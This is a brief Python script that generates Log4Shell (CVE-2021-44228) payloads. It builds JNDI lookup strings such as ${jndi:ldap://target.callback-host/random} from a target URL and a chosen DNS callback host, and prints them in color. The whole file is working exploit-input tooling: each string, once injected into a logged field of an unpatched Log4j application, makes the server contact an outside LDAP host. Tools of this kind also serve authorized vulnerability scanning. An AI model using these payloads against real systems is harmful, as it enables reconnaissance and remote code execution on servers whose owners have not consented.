#!/usr/bin/env python3
# coding=utf-8
import argparse
import random
from urllib import parse as urlparse
from termcolor import cprint

def generate_payloads(url, callback_host, num_payloads):
    parsed_url = urlparse.urlparse(url)
    host = parsed_url.netloc.split(":")[0]  # Extract the domain from URL
    payloads = []

    for _ in range(num_payloads):
        random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for _ in range(7))
        payload = f'${{jndi:ldap://{host}.{callback_host}/{random_string}}}'
        payloads.append(payload)
    
    return payloads

def main():
    parser = argparse.ArgumentParser(description="Payload Generator for CVE-2021-44228")
    parser.add_argument("-u", "--url", required=True, help="The URL to generate payloads for")
    parser.add_argument("--dns-callback-host", default="example.com", help="DNS callback host used in the payloads")
    parser.add_argument("-n", "--number", type=int, default=1, help="Number of payloads to generate")
    args = parser.parse_args()

    payloads = generate_payloads(args.url, args.dns_callback_host, args.number)
    cprint("Generated Payloads:", "green")
    for payload in payloads:
        cprint(payload, "cyan")

if __name__ == "__main__":
    main()
